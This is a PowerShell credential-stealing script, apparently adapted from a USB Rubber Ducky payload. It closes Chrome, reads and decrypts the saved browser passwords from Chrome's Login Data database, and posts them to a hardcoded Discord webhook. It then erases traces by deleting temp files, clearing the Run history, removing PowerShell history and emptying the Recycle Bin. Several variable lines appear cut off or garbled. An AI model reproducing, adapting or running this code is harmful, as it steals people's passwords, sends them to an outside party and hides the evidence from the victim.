#orignal: https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/credentials/Browser-Passwords-Dropbox-Exfiltration/Version%2001/Browser-Passwords-Dropbox-Exfiltration.ps1  
$DiscordWebhookURL = "https://discord.com/api/webhooks/1137762085166657567/eXk-Sa6VaewqkzPvzF-O51MfE3COqfWRdaSBlJhn4ny_O43fhWa_lC033WZKrCLm3Lvc"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

Stop-Process -Name Chrome

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env
+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\Default\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$})-join''}

echo $l >> $env
$FileName

$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome


$SourceFilePath="$env
$FileName"
$fileContent = [System.IO.File]::ReadAllText($SourceFilePath)
$payload = @{
    "content" = "User Credentials File"
    "embeds" = @(
        @{
            "title" = "Credentials File"
            "description" = "```${fileContent}```"
            "color" = 16711680
        }
    )
}
$payloadJson = $payload | ConvertTo-Json
Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -ContentType "application/json" -Body $payloadJson

rm $env
* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#exit
